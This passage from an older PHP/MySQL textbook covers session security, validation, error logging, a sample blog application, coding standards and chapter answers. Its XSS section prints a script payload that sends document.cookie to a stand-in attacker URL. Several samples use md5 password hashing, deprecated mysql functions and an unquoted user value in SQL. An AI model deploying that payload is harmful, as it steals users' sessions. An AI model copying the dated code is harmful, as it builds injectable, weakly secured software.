 ses-sion. If someone is listening in or snooping on a network, it’s possible that she 
 can intercept a session ID and use it to look like she is someone else. It’s also 
 possible to access session data from the local filesystem on multiuser systems such 
 as ISP host-ing machines.",NA
Session Hijacking and Session Fixation,"Session hijacking
  is when someone accesses either a client’s cookie or session ID 
 and then attempts to use this data.
  Session fixation
  is attempting to set your own 
 session ID. Session fixation and hijacking are easy to combat. You’d use super global 
 vari-ables for the client’s IP address and browser type to keep things secure.
  
 Example 15-8 demonstrates encoding the information with an
  md5
  function call to 
 thwart these potential security holes.
  
 Example 15-8. Checking for session hijacking
  
 <?php 
  
 session_start( ); 
  
 $user_check = md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']); 
  
 if (empty($_SESSION['user_data'])) {
  
  
  session_regenerate_id( );
  
  
  echo (""New session, saving user_check."");
  
  
  $_SESSION['user_data'] = $user_check; 
  
 } 
  
 if (strcmp($_SESSION['user_data'], $user_check) !== 0) {
  
  
  session_regenerate_id( );
  
  
  echo (""Warning, you must reenter your session."");
  
  
  $_SESSION = array( );
  
  
  $_SESSION['user_data'] = $user_check; 
  
 }
  
 316
  
 |
  
 Chapter 15: Security",NA
Trusting User Data,"You know that trusting data from a user isn’t a great idea. But what exactly do you 
 consider to be user data versus system data that you trust? Our list shows different 
 user data and their implications.
  
 GET 
  
 Data from
  GET
  operations is inherently user data since it usually comes from 
 form submissions and URL parameters.
  
 POST 
  
 Data from
  POST
  operations is inherently user data since it usually comes from 
 form submissions.
  
 318
  
 |
  
 Chapter 15: Security",NA
Shared Hosting Concerns,"If you don’t have your own dedicated server or are on a server that has multiple 
 users, it can be very dangerous to use the default PHP settings to store your user’s 
 session data in a temporary directory. Normally, all users have access to that 
 tempo-rary directory, so they can easily pilfer private data from the session, 
 including the session ID.
  
 To make your session data more secure, you can set the
  session.save_path
  configu-
 ration parameter with the
  ini_set
  function to change the path where sessions are 
 stored, as shown in Example 15-9. Make sure that these are stored below the web 
 root directory.
  
 Example 15-9. session.save_path functionality
  
 <?php
  
  
  ini_set('session.save_path', '/home/user/sessions/');
  
  
  session_start( ); 
  
 ?>
  
 Session Security
  
 | 319",NA
Preventing Access to the Database,"There are a couple of ways to reduce the chance that a malicious user can access 
 your database. First, if there’s a problem connecting to the database, the default 
 MySQL error code reveals the location of the database—in other words, the IP 
 address of the host. You should suppress that information.
  
 To prevent the standard error message from PHP, add the Error Control Operator, 
 which is the at sign (
 @
 ), to the front of the database function call. You’ll experience 
 a more closed-lipped or dubious error message in Example 15-10 before calling
  die
  
 to stop all processing.
  
 Example 15-10. Suppressing the standard database error message
  
 <?php 
  
 require_once('db_login.php'); 
  
 $error = ""Site down for maintenance, please check back.""; 
  
 $db_link = @mysql_connect($db_host, $db_username, $db_password) or die($error); 
 @mysql_select_db($db_database, $db_link) or die($error); 
  
 ?>
  
 Without the at sign (
 @
 ) before the function calls, you’ll see Figure 15-12.
  
  
 Figure 15-12. The database server’s location is revealed in the error message
  
 From a security standpoint, notice how little the error message in Figure 15-13 
 reveals to a potential attacker about the environment.
  
 320
  
 |
  
 Chapter 15: Security",NA
Blocking Access to the Database for External Hosts,"If your MySQL database server is on the same host as the web server, it makes good 
 sense to block access to the database port for external users. This can be done 
 through the firewall setup utilities that are part of your operating system. The stan-
 dard TCP/IP port number for MySQL is 3306. The
  port number
  is used to differenti-
 ate between services on the same host.",NA
Create Separate Database Users,"If you’re running more than one application on your server, you should set up sepa-
 rate database users within MySQL for each application. That way, if there’s a secu-
 rity breach in one of the applications, the data for the other application wouldn’t be 
 compromised. For example, if you have a bookstore web site, you can create all of 
 your database objects to be accessible from a bookstore database account. Another 
 site for employees to check their timesheets could then be set up using a separate 
 database login. Each application continues to work well, and in the event of a secu-
 rity breach, the extent of damage is limited.",NA
Cross-Site Scripting,"Cross-site scripting (XSS) attacks are a well-known problem for any web 
 application that displays user data including pages built with PHP. The problem lies 
 in display-ing unfiltered user data. For example, a malicious user could submit the 
 following JavaScript code in a form field called
  article
 :
  
 <script> 
  
 document.location = 'http:/scam.ng/yoink.php?your_private_cookies=' + document.cookie </script>
  
 Session Security
  
 | 321",NA
Chapter 15 Questions,"Question 15-1 
  
 Why should you use the
  .php
  extension for
  include
  files when other extensions 
 such as
  .inc
  could be used instead?
  
 Question 15-2 
  
 What’s a more secure function than
  md5( )
  for encoding passwords before 
 they’re stored in the database?
  
 Question 15-3 
  
  
 Why shouldn’t you use automatic global variables in your code?
  
 Question 15-4 
  
  
 What is considered to be untrustworthy user 
 data?
  
 See the “Chapter 15” section in the Appendix for the answers to these questions.
  
 324
  
 |
  
 Chapter 15: Security",NA
CHAPTER 16,NA,NA
Validation and Error Handling,"16
  
 We’ve already discussed performing validation within our PHP code. In this chapter 
 we’ll explore our options for validating form data before a form submission. We’ll 
 also discuss what to do when validation fails, and how to process other errors. We 
 can check information on the client side in the user’s browser with JavaScript. We 
 can also check the data when it’s submitted directly in PHP.
  
 There’s some information that can go out as part of a production error message 
 that isn’t harmful for end users. For example, it’s OK to say that you’re having a 
 problem connecting to your database. However, you don’t want to reveal more 
 information than is necessary in any error messages that may go out to end users. 
 You don’t want to disclose the IP address of your database and certainly not the 
 username that was attempted when you tried to connect. Both of those could aid a 
 potential attacker in breaking into the database when it comes back online.",NA
Validating User Input with JavaScript,"On the client side, your best tool for validating data is JavaScript. JavaScript is 
 differ-ent than PHP because it’s designed to execute in the user’s browser instead 
 of on the server. Because it executes from the client’s computer, JavaScript isn’t 
 allowed to access anything that could be a security risk, such as the local filesystem 
 or network resources. JavaScript is primarily used in web pages. Although its name 
 sounds like Java, it has no relationship to it.
  
 Since this processing is built into most modern browsers, it’s not difficult for end 
 users to disable it. Therefore, even when you use JavaScript, always take 
 precautions to handle the possibility of it not being present on the browser.
  
 Some of the practical things you can do with JavaScript are checking fields and 
 alert-ing the user to a problem before the data is submitted to the server. The 
 validation can be as simple as checking for an empty field, or it can do more 
 complex checks such as validating an email address.
  
 325",NA
Pattern Matching,"Pattern matching
  allows you to build expressions that match strings using a specific 
 matching syntax called a
  regular expression
 . Regular expressions allow you to per-
 form searching tasks such as separating out a certain tag for an incoming text file or 
 validating user input such as an email address.
  
 The easiest way to use regular expressions in PHP is to use the PCRE (Perl-compati-
 ble regular expressions) extension. This extension is installed by default, so it 
 should be part of your PHP environment. PHP also supports a style of regular 
 expression matching functions called
  ereg
 . They’re similar to the Unix
  grep
 -style 
 regular expres-sions but are older and less compatible than PCRE functions. Their 
 advantage is that they’re installed on all but the oldest versions of PHP.
  
 Pattern Matching
  
 | 329",NA
Redisplaying a Form After PHP Validation Fails,"While you intend for JavaScript to catch errors up front, before the user has navi-
 gated away from the page through the form submission, there will be times when 
 PHP catches an error. When this happens, an informative error message displays 
 and the form that had a validation problem is redisplayed. When redisplaying the 
 form, it’s a much smoother user experience if the data the user submitted is 
 prepopulated in the form. There’s nothing worse than filling out a page-long form 
 only to find out there’s a missing checkbox and that you have to start over.
  
 We’ll modify our previous example to check whether a username is already present 
 in the
  users
  table, as shown in Example 16-4.
  
 Example 16-4. Displaying an error from PHP and redisplaying the 
 form 
  
 with submitted values
  
 <html> 
  
 <head> 
  
 <title>Sample Form</title>
  
 Redisplaying a Form After PHP Validation Fails
  
 | 333",NA
Error Logging,"There are several PHP configuration parameters that affect error logging. On a pro-
 duction server, you don’t want errors to display to the end user as they can reveal 
 details that an attacker may use. The first parameter determines whether any 
 errors display. It’s called
  display_errors
 . It can be set to
  On
  or
  Off
 :
  
 display_errors = On; //causes errors to print to the screen
  
 336
  
 |
  
 Chapter 16: Validation and Error Handling",NA
Chapter 16 Questions,"Question 16-1 
  
  
 What are the pros and cons of using JavaScript to validate form input?
  
 Chapter 16 Questions
  
 | 337",NA
CHAPTER 17,NA,NA
Sample Application,"17
  
 You now know enough about PHP and MySQL to build full-featured web applica-
 tions. These could be practically anything from web-based mail clients to online 
 stores with shopping carts and checkout capabilities. For our demonstration, we’re 
 going to work with blogs, as they’re currently quite popular. Even though there is 
 excellent blog software available, this is the easiest example to get you rockin’ and 
 rollin’ with PHP and MySQL.
  
 A
  blog
  is short for weblog. It’s an improvement on the simple guestbook and forums 
 that started appearing on web sites years ago. They’re now advanced enough to 
 cre-ate mini-communities of people with similar interests or simply a place to post 
 your rants about daily living. Blogs have been in the media as well. As Jeff Jarvis 
 said in 
 BuzzMachine
  (
 http://www.buzzmachine.com
 ), “...just as the raw voice of 
 blogs makes newspeople uncomfortable. It’s the sound of the future.” Some blog 
 exam-ples are:
  
 •
  http://www.americablog.org/
  
 •
  http://mark-watson.blogspot.com/2005/02/pushing-java-back-into-
 background-
  
 for.html
  
 As you can see from these two blog examples, one is political, and the other is about 
 Mark Watson’s life. Of course, we’ve been given permission to use these blogs as 
 examples, but go ahead and type in
  blogs
  in Google, and almost 3.5 million hits dis-
 play. 
 Weblogs 
 are 
 a 
 huge 
 trend; 
 there 
 are 
 sites 
 such 
 as
  
 http://www.blogexplosion.com/ 
 where you can register your blog and drive more 
 traffic to it, or
  http://www. blogarama.com/
 , which is a blog search engine. The 
 market is hot for these online diaries, or diatribes!
  
 There are several things you need to do when you establish a blog:
  
 • Register users for blog entry revision
  
 • View and post articles
  
 • Categorize posts
  
 339",NA
Configuration File,"We’ll create a common configuration file called
  config.php
  to define where files are 
 located, the name of the blog, and other basic configuration parameters. This is 
 simi-lar to the way your database connection information is stored in the
  
 db_login.php 
 file.
  
 Example 17-1 shows what it looks like.
  
 Example 17-1. The config.php script defines settings that are used throughout the site
  
 <?php 
  
 // put full path to Smarty.class.php 
  
 require('/usr/share/php/Smarty/Smarty.class.php'); 
  
 $smarty = new Smarty( );
  
 $smarty->template_dir = 
 '/home/www/htmlkb/smarty/templates'; 
  
 $smarty->compile_dir = '/home/www/htmlkb/smarty/templates_c'; 
  
 $smarty->cache_dir = '/home/www/htmlkb/smarty/cache'; 
  
 $smarty->config_dir = '/home/www/htmlkb/smarty/configs';
  
 $blog_title=""Coffee Talk Blog""; 
  
 ?>
  
 We use
  /home/www/htmlkb/smarty
  as our path to the template engine files, but 
 your path will be different based on where you installed Smarty. Note that all the 
 tem-plate files go into the directory that
  $smart->template_dir
  points to. We also set 
 the name of the blog to “Coffee Talk Blog.” We’re going to discuss templates for 
 pages, which is similar to having a CSS stylesheet, yet different. Templates, like a 
 CSS stylesheet, will enable your blog to have a consistent look and feel.",NA
Page Framework,"We’re going to use templates, which you learned about earlier, to help us build 
 pages that are consistent in their appearance and easy to modify. Let’s start by 
 setting up header and footer templates to include at the top and bottom of our 
 pages using Smarty.
  
 Again, these files must go into the directory defined in
  config.php
 , which isn’t the 
 same directory in which the PHP files reside. In our case, it’s
  /home/www/htmlkb/ 
 smarty/templates
 , shown in Example 17-2.
  
 340
  
 |
  
 Chapter 17: Sample Application",NA
Database,"We already created a
  users
  table for our bookstore examples. We’ll add another 
 user to that table to help us demonstrate ownership of postings and comments—
 specifi-cally, how we can modify them. We’ll then have three new tables for our 
 blog: a table to store the categories, a table to store the posts, and a table to store 
 the com-ments. We’ll be using natural joins in our
  SELECT
  statements, since the key 
 fields share the same names between related tables.
  
 Database
  
 | 343",NA
Sample Data,"To keep things simple, we’re going to insert some test data using Example 17-9. 
 The test data lets us build pages to display posts, and immediately see them 
 displayed without having to build pages that add entries for them. Once we display 
 posts, we’ll code the pages to add posts and modify them. This same process is used 
 for comments.
  
 Example 17-9. Inserting sample data for the tables
  
 INSERT INTO categories VALUES (1,'Press Releases'); 
  
 INSERT INTO categories VALUES (2,'Feature Requests');
  
 INSERT INTO posts VALUES (NULL,1,1,'PHP Version 12','PHP Version 12, to be released 
 third quarter 2020. Featuring the artificial inteligence engine that writes the code for 
 you.',NULL); 
  
 INSERT INTO posts VALUES (NULL,1,1,'MySQL Version 8','Returns winning lotto 
 number.',NULL); 
  
 INSERT INTO posts VALUES (NULL,2,2,'Money Conversion',' Please add functions for 
 converting between foreign currencies. ',NULL);
  
 INSERT INTO comments VALUES (NULL,1,1,'Correction','Release delayed till the 
  
 year 2099',NULL);
  
 INSERT INTO users VALUES (NULL,'Michele','Davis','mdavis',md5('secret')); INSERT INTO 
 users VALUES (NULL,'Jon','Phillips','jphillips',md5('password'));
  
 Database
  
 | 345",NA
Displaying a Postings Summary,"If you’re not sure how to do something in the template beyond the objects we cre-
 ated, visit the online documentation for Smarty templates at
  http://smarty.php.net
 . 
 The templates separate the look and feel of the pages from the code that populates 
 their data. While using the templates requires a little more work to set up and 
 figure out the syntax, it reduces the overall amount of code you need to write. 
 Smarty knows how to automate mundane tasks such as generating drop-down lists 
 when building forms.
  
 We’re going to go right ahead and jump into building the main display page that 
 works in tandem with its template, shown in Example 17-10. Be sure to place the 
 template files in the same directory that’s established in your
  config.php
  file. The 
 PHP files can go anywhere you like as long as they’re web-accessible.
  
 Example 17-10. The posts.php script displays a listing of posts and their subjects
  
 1 <?php 
  
 2 session_start( ); 
  
 3 require_once('config.php'); 
  
 4 require_once('db_login.php'); 
  
 5 require_once('DB.php'); 
  
 6 // Display the page header 
  
 7 $smarty->assign('blog_title',$blog_title); 
  
 8 $smarty->display('header.tpl'); 
  
 9 // Check for valid login 
  
 10 if (!isset($_SESSION['username'])) { 
  
 11     echo 'Please <a href=""login.php"">login</a>.'; 
  
 12 } 
  
 13 else { 
  
 14     // Connect to the database 
  
 15     $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_ 
  
 database""); 
  
 16 
  
 17     if (DB::isError($connection)){ 
  
 18         die (""Could not connect to the database: <br />"". DB:: 
  
  
 errorMessage($connection)); 
  
 19     } 
  
 20     // Query the posts with catagories and user information 
  
 21     $query = ""SELECT * FROM users NATURAL JOIN posts NATURAL JOIN categories ORDER BY 
  
 posted DESC""; 
  
 22     // Execute the database query 
  
 23     $result = $connection->query($query); 
  
 24     if (DB::isError($result)){
  
 346
  
 |
  
 Chapter 17: Sample Application",NA
Displaying a Posting and Its Comments,"To create the
  view_post.php
  script, we’ll reuse some of the code and add a bit in 
 Example 17-12. The script takes a
  post_id
  as a
  GET
  parameter and displays the post-
 ing, including its body. Comments for the posting are also listed. The user who cre-
 ates the posting can delete or modify it. Likewise, users can delete or modify any 
 comment entries they’ve created in your blog.
  
 Example 17-12. The view_post.php script displays a summary of its comments
  
 <?php
  
 session_start( );
  
 require_once('config.php'); 
  
 require_once('db_login.php'); 
  
 require_once('DB.php');
  
 // Display the header 
  
 $smarty->assign('blog_title',$blog_title); 
  
 $smarty->display('header.tpl');
  
 // Check for valid login 
  
 if (!isset($_SESSION[""username""])) {
  
  
  echo 'Please <a href=""login.php"">login</a>.';
  
  
  exit; 
  
 }
  
 // Connect to the database 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database"");
  
 if (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); }
  
 $post_id = $_GET[""post_id""]; 
  
 $post_id=mysql_real_escape_string(get_magic_quotes_gpc( ) ? stripslashes($post_id) : $post_id);
  
 $query = ""SELECT * FROM users NATURAL JOIN posts NATURAL JOIN categories
  
  
  WHERE post_id=$post_id""; 
  
 $result = $connection->query($query);
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"".$query."" "".DB::errorMessage($result)); }
  
 while ($result_row = $result->fetchRow(DB_FETCHMODE_ASSOC)) {
  
  
  $test[]=$result_row; 
  
 }
  
 Displaying a Posting and Its Comments
  
 | 349",NA
Adding and Changing Posts,"The adding and changing functionalities are grouped together because they both 
 build the same HTML form to add or modify the posting, as well as the validation 
 steps before saving to the database. Again, we’re building on the concept of using 
 the same script to generate an HTML form and process its submission.
  
 Example 17-14 lists the script.
  
 Example 17-14. modify_posts.php
  
 1 <?php 
  
 2 include('db_login.php'); 
  
 3 require_once('DB.php'); 
  
 4 require_once('config.php'); 
  
 5 
  
 6 //check for valid login 
  
 7 session_start( ); 
  
 8 
  
 9 $stop=FALSE; 
  
 10 $found_error=FALSE; 
  
 11 //display the header 
  
 12 $smarty->assign('blog_title',$blog_title); 
  
 13 $smarty->display('header.tpl'); 
  
 14 
  
 15 if  (!isset($_SESSION['username'])) { 
  
 16     echo (""Please <a href='login.php'>login</a>.""); 
  
 17     $stop=TRUE; 
  
 18 } 
  
 19 //grab submission variables 
  
 20 $post_id=$_POST[post_id]; 
  
 21 $title= $_POST['title']; 
  
 22 $body= $_POST['body'];
  
 352
  
 |
  
 Chapter 17: Sample Application",NA
Adding and Changing Comments,"The code for working with comments is nearly identical to the PHP code for 
 modify-ing posts. This is because posts and comments are considered the same 
 thing in your code. There isn’t much difference between them. The changes are 
 emphasized in Example 17-16.
  
 358
  
 |
  
 Chapter 17: Sample Application",NA
Chapter 17 Questions,"Question 17-1 
  
  
 Change the blog name to “PHP and MySQL Zone.”
  
 Question 17-2 
  
  
 Add a new posting category called “Bugs.”
  
 Question 17-3 
  
  
 What’s the advantage of using templates?
  
 See the “Chapter 17” section in the Appendix for the answers to these questions.
  
 Chapter 17 Questions
  
 | 365",NA
CHAPTER 18,NA,NA
Finishing Your Journey,"18
  
 You’ve created a blog. You’ve started out learning the ins and outs of dynamic web 
 development, and how the Internet world is changing rapidly. Dynamic web sites 
 are what clients, your employer, and your volunteer organizations—or even just 
 you—desire. While static pages have their place in web development, new tools 
 such as Ajax and Ruby are stepping-stones after learning PHP and MySQL.
  
 This chapter will arm you with numerous resources that can help you during your 
 PHP and MySQL journey.",NA
PHP Coding Standards,"As you’ve probably guessed, this standard is a document that shows proper format 
 and syntax for variable names, control structures, and much more. These format 
 and syntax recommendations help you minimize coding errors. Currently, some 
 sites that address this include:
  
 •
  http://srparish.net/writings/php_code_standards.html
  
 •
  http://www.phpfreaks.com/tutorials/35/0.php
  
 •
  http://www.phpcommunity.org/node/139
  
 We’re going to do a minor recap of some of the important concepts covered 
 through-out the book along with code examples. This is just a refresher to jog your 
 brain into remembering a lot of the content you’ve already digested.",NA
Comments,"Some basic coding standards are comments that help you remember what your 
 code is doing. You may need to go back and look at code you wrote several months 
 ago. What seems straightforward now may take considerable time to discern later 
 unless you leave some meaningful explanations. Remember that PHP uses the same 
 style for comments as C++, including
  /* */
  and
  //
 .
  
 366",NA
Formatting,"While there are different acceptable styles for names and spacing, the most impor-
 tant thing is that you pick one and stick with it so that your code has consistent 
 visual indicators to anyone who may work with it.
  
 PHP Coding Standards
  
 | 367",NA
Objects,"Objects have general design rules to aid their design and use because of their com-
 plexity. Each object should have only attributes associated with it that are directly 
 related to the object. Each object should have its own error handling defined so that 
 errors don’t need to propagate to higher level objects that likely don’t know as 
 much about the environment in which the error occurred. Likewise, all objects 
 should have their own constructor methods.",NA
Naming,"Here are some guidelines for naming:
  
 • Name your functions to indicate what they do; for example,
  connectDatabase
 , 
  
 deleteUser
 .
  
 • Name your variables to indicate what they store; for example,
  DatabaseName
 , 
  
 RowCount
 .
  
 • Name constants using uppercase descriptive words with underscores to 
 separate words. If the constant belongs to an object, prefix the constant with 
 the name of the package.
  
 • Abbreviations are OK as long as they’re used consistently and aren’t too difficult 
  
 to interpret.
  
 • Global variables should use longer names than local variables do.
  
 PHP Coding Standards
  
 | 369",NA
Control Structures,"Control structures include
  if
 ,
  for
 ,
  while
 , and
  switch
 . You should indent four spaces for 
 the
  if
  statement. There should be one space between the statement and the opening 
 parenthesis for the expression. This helps to differentiate them visually from 
 function calls. For example:
  
 if ((expression1) || (expression2)) {
  
  
  do_something; 
  
 } 
  
 elseif ((expression3) && (expression4)) {
  
  
  do_something_else; 
  
 } 
  
 else {
  
  
  do_default; 
  
 }
  
 Curly braces (
 {}
 ) make reading your code easier and help to reduce errors. Use them 
 even if you have only one statement to execute in the block.
  
 Here’s an example for
  switch
  statements:
  
 switch (expression) {
  
  
  case 1: {
  
  
  
  do_something_1;
  
  
  
  break;
  
  
  }
  
  
  case 2: {
  
  
  
  do_something_2;
  
  
  
  break;
  
  
  }
  
  
  default: {
  
  
  
  do_default;
  
  
  
  break;
  
  
  } 
  
 }
  
 Including or requiring PHP files
  
 When you use
  include_once
  and
  require_once
 , they guarantee that the code won’t be 
 included more than once. They’re intelligent enough to keep track of which code 
 has been included between them:
  
 include_once('example.php'); 
  
 require_once('example.php');
  
 This example won’t include
  example.php
  more than once.
  
 Be sure to use
  require
  when your code can’t continue if the file to include is missing. 
 Optional code can and should use
  include
 :
  
 include('optional_functions.php');
  
 370
  
 |
  
 Chapter 18: Finishing Your Journey",NA
PEAR,"PEAR stands for PHP Extension and Application Repository. PEAR provides the 
 following:
  
 • A structured library of open source code for PHP users (
 http://opensource.org
 )
  
 • A code distribution and package maintenance system
  
 • A standard code style developed in PHP
  
 • The PHP Extension Community Library or PECL
  
 PEAR is an open source community with all the benefits that open source provides. 
 Stig S. Bakken founded it in 1999.",NA
Structured Libraries,"The code in PEAR is partitioned into packages. Each package is really just a 
 separate project with its own development team, version number, release cycle, 
 documenta-tion, and a defined relation to other packages. Every package can be 
 found on
  http:// pear.php.net/
 . Each distribution uses the PEAR installer for the 
 package to be installed on your local system.
  
 Packages may relate to each other through dependencies, but there is no automatic 
 dependency relationship between packages referenced by similar names. For 
 exam-ple, the
  DB_DataObject
  package depends on the
  DB
  package, but this isn’t 
 always the case.
  
 There is also a style guide called the
  PEAR Coding Standards
  (PCS), which helps to 
 maintain quality and consistency of all the code that’s distributed within the 
 packages.
  
 Code distribution
  
 Packages are distributed as
  gzipped
  tar files with an XML description file included. 
 The description file, usually called
  package.xml
 , contains package information, a file 
 list, and the files’ roles, including dependencies.
  
 PHP Extension Community Library (PECL)
  
 PECL (which, strangely, is pronounced like “pickle”) is a separate project that dis-
 tributes PHP extensions that are compiled code written in C. PECL extensions are 
 also distributed as packages, and they can be installed using the PEAR installer with 
 the
  pecl
  command. More information and all PECL packages are here:
  http://pecl. 
 php.net/
 .
  
 PEAR
  
 | 371",NA
Frameworks,"PHP
  frameworks
  are designed to aid rapid application development. Frameworks 
 speed up common web development tasks and offer integration between the com-
 mon elements, such as database access, templating, and session management. 
 There are many frameworks available and new ones evolving. Two popular 
 frameworks are PHP Zend and Cake.",NA
PHP Zend Framework,"The Zend Framework aims to provide a complete system for developing web 
 applica-tions designed to work with PHP 5.0. Zend is working toward providing a 
 reposi-tory of high-quality code to aid developers.
  
 The official site for the Zend Framework is
  http://framework.zend.com/
 .",NA
CakePHP,"Cake is compatible with both PHP4 and PHP5. It’s loosely based on the Ruby on 
 Rails framework for developing Ruby web applications. It encourages the use of the 
 Model View Controller (MVC) style of application development that separates data 
 access and business logic from presentation. It comes with built-in support for Ajax 
 as well.
  
 The official web site for Cake is
  http://cakephp.org/
 .
  
 372
  
 |
  
 Chapter 18: Finishing Your Journey",NA
Ajax,"Ajax
  is short for Asynchronous JavaScript and XML. Ajax is a technique for making 
 web pages more dynamic without refreshing the page. It’s actually a mix of several 
 technologies that allows a web site to request more information from a web server 
 while the user navigates a page. An example of a site that uses Ajax is Google Maps 
 (
 http://maps.google.com/
 ). As you scroll a map (type in your home address to try 
 this out), Ajax retrieves additional map data.
  
 On a technical level, the technologies involved are XHTML, CSS, and JavaScript to 
 access the Document Object Model (DOM). The
  XMLHttpRequest
  function provides 
 the ability to make subsequent requests to get more information from the web 
 server without refreshing the page. An
  IFrame
  object may also be used to request 
 the 
 data 
 asynchronously. 
 For 
 more 
 information 
 on 
 Ajax, 
 visit
  
 http://developer.mozilla.org/en/ docs/AJAX
 .",NA
Wikis,"A
  Wiki
  is a collaborative online repository of information. Anyone can contribute to 
 and modify content. Changes are arbitrated by community consensus. The most 
 famous Wiki is Wikipedia (
 http://wikipedia.org
 ) and its related MediaWiki (
 http:// 
 mediawiki.org
 ) project that powers the site and is open source. Wikis are becoming 
 a larger presence on the Web. Fortunately, MediaWiki is developed in PHP and 
 MySQL, so using and modifying it should feel natural.",NA
Finding Help on the Web,"The Web contains a plethora of information. Remember, both PHP and MySQL are 
 open source technologies, supported by a community of developers who share 
 their work. That means that code is readily available on the Web for your use. 
 There may be some code glitches, but there is help on the Web when you type your 
 query into a search engine. We prefer Google, but you can use Yahoo! or even MSN 
 to find use-ful links.
  
 First of all, you should download the PHP manual available at
  http://www.php.net/ 
 docs
 . The manual is pretty cool, since you can rapidly access any page of it if you’re 
 looking for a particular function by going to
  http://www.php.net/
 function_name 
 (you’ll fill in the italicized function name that you’re searching). There is also a 
 search utility for functions, so you don’t need to always fill in the full function name.
  
 There are numerous web sites available for your perusal. For PHP-specific informa-
 tion, the following web sites will help you:
  
 Finding Help on the Web
  
 | 373",NA
PHP User Groups ,"Check out
  http://www.phpusergroups.org/
  if you wish to locate a group in your city, 
 state, or country. There are 348 PHP user groups in 69 countries. If you’re in the 
 U.S., there are numerous groups representing most major cities. The current U.S. 
 groups are listed in Table 18-1.
  
 Table 18-1. U.S. PHP groups
  
 Group 
 location
  
  
 Group URL
  
 Atlanta, GA
  
 http://atlantaphp.org/
  
 Austin, TX
  
 http://php.meetup.com/42/
  
 Cedar Lake, IN
  
 http://www.tjtechinc.com/nipug/
  
 Chicago, IL
  
 http://chiphpug.php.net/
  
 Dallas/Fort 
 Worth, TX
  
 http://www.dallasphp.org/
  
 Denver, CO
  
 http://www.coloradophp.org/
  
 374
  
 |
  
 Chapter 18: Finishing Your Journey",NA
Chapter 18 Questions,"Question 18-1 
  
  
 Why shouldn’t you use
  <?
  and
  ?>
  to start and end your PHP code blocks?
  
 Question 18-2 
  
  
 What’s the difference between using
  //
  comments and
  /* */
  comments?
  
 Question 18-3 
  
 What’s the advantage of using the
  include_once( )
  and
  require_once( )
  direc-tives 
 instead of
  include( )
  and
  require( )
 ?
  
 Question 18-4 
  
  
 What’s wrong with this code?
  
 <? if ($_GET[user_id] == 'Admin') echo ('Welcome to the control panel.'); 
  
 else echo ('Welcome.'); ?>
  
 See the “Chapter 18” section in the Appendix for the answers to these questions.
  
 Chapter 18 Questions
  
 | 375",NA
APPENDIX,NA,NA
Solutions to Chapter Questions,1,NA
Chapter 1,"Solution to Question 1-1 
  
  
 A web server, a server-side programming language, and a 
 database.
  
 Solution to Question 1-2 
  
  
 Modules.
  
 Solution to Question 1-3 
  
  
 Structured Query Language.
  
 Solution to Question 1-4 
  
  
 They enclose HTML markup.
  
 Solution to Question 1-5 
  
  
 It processes the HTML and PHP files.",NA
Chapter 2,"Solution to Question 2-1 
  
  
 Apache, PHP, and MySQL.
  
 Solution to Question 2-2 
  
  
 Mac OS X and many Linux distributions.
  
 Solution to Question 2-3 
  
  
 The desktop.
  
 Solution to Question 2-4 
  
  
 It indicates lines that are commented out.
  
 Solution to Question 2-5 
  
  
 By not working on your local drive and transferring your files to a 
 server.
  
 Solution to Question 2-6 
  
  
 You can use an FTP program.
  
 Solution to Question 2-7 
  
  
 Through a web server.
  
 377",NA
Chapter 3,"Solution to Question 3-1 
  
  
 Everything renders as text; there is no 
 code.
  
 Solution to Question 3-2 
  
 HTML markup.
  
 Solution to Question 3-3 
  
  
 By using two slash (//) marks or /* 
 */.
  
 Solution to Question 3-4 
  
 PHP offers single-line comments, which are indicated by two slash (//) marks, 
 and multiline comments, which are indicated by an asterisk and slash. Use (/*) 
 to open a multiline comment and (*/) to close it. The third kind of comment 
 comes from HTML, opening with
  <!--
  and closing with
  -->
 .
  
 Solution to Question 3-5 
  
  
 A semicolon (;) ends all statements in PHP.
  
 Solution to Question 3-6 
  
  
 A value.
  
 Solution to Question 3-7 
  
  
 By using the following form:
  $variable_name = value;
 .
  
 Solution to Question 3-8 
  
  
 Yes.
  
 Solution to Question 3-9 
  
  
 They allow you to group code chunks together and execute them by their 
 names.
  
 Solution to Question 3-10 
  
  
 A super global.
  
 Solution to Question 3-11 
  
  
 By using the backslash (
 \
 ).
  
 Solution to Question 3-12 
  
  
 It compares two strings, including case.
  
 Solution to Question 3-13 
  
  
 Concatenation, as well as ‘.’ and ‘=’ for PHP.
  
 Solution to Question 3-14 
  
  
 A string.",NA
Chapter 4,"Solution to Question 4-1 
  
  
 Code that performs a task.
  
 Solution to Question 4-2 
  
  
 An operator.
  
 378
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 5,"Solution to Question 5-1 
  
 This isn’t a valid function. It’s missing the parentheses; furthermore, it’s bad 
 style to mix functions with your main code.
  
 Solution to Question 5-2 
  
  
 To define the toast function with a parameter:
  
 <?php 
  
 function toast( $minutes ){
  
  //do the toasting here
  
  echo (""done.""); 
  
 } 
  
 ?>
  
 Solution to Question 5-3 
  
  
 To call toast with
  5
  as the minutes 
 parameter:
  
 <?php 
  
 toast(5); 
  
 ?>
  
 Solution to Question 5-4 
  
 When you are using
  include( )
  and a file can’t be found, only a warning issues. 
 However, when you are using
  require( )
 , a missing file causes a fatal error that 
 terminates the execution of the script.
  
 Solution to Question 5-5 
  
  
 A method.",NA
Chapter 6,"Solution to Question 6-1 
  
  
 The first element is located in position
  0
  of the 
 array.
  
 Solution to Question 6-2 
  
  
 The
  $months
  array can be created as 
 follows:
  
 <?php 
  
 $months[]='January'; 
  
 $months[]='February'; 
  
 $months[]='March'; 
  
 $months[]='April'; 
  
 $months[]='May'; 
  
 $months[]='June'; 
  
 $months[]='July'; 
  
 $months[]='August'; 
  
 $months[]='September'; 
  
 $months[]='October'; 
  
 $months[]='November'; 
  
 $months[]='December'; 
  
 ?>
  
 380
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 7,"Solution to Question 7-1 
  
  
 The
  mysql
  command provides an interactive interface to MySQL.
  
 Solution to Question 7-2 
  
  
 Create the
  months
  table as follows:
  
 CREATE TABLE months (
  
  month_id INT NOT NULL 
 AUTO_INCREMENT,
  
  month VARCHAR (20),
  
  days INT,
  
  PRIMARY KEY (month_id));
  
 Chapter 7
  
 | 381",NA
Chapter 8,"Solution to Question 8-1 
  
  
